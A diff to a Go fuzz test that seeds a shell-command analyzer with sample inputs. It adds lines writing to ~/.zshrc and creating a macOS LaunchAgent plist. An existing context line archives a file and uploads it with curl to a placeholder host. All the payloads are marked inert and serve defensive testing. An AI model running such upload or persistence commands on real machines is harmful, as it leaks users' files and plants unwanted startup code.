@@ -14,6 +14,10 @@ func FuzzShellPathFlow(f *testing.F) {
 		"p=~/inert.tgz\ntar -czf \"$p\" /tmp/inert-input",
 		"tar -czf '~/inert.tgz' /tmp/inert-input; curl -T ~/inert.tgz https://example.invalid/upload",
 		"cd /tmp/inert |\nHOME='unterminated",
+		`printf '%s' inert > '~/.zshrc'`,
+		`printf '%s' inert 2>&1 > "$HOME/.zshrc"`,
+		`printf '%s' inert > /tmp/first > /tmp/second`,
+		"cat <<EOF > ~/Library/LaunchAgents/com.example.inert.plist\ninert\nEOF",
 	} {
 		f.Add(source)
 	}
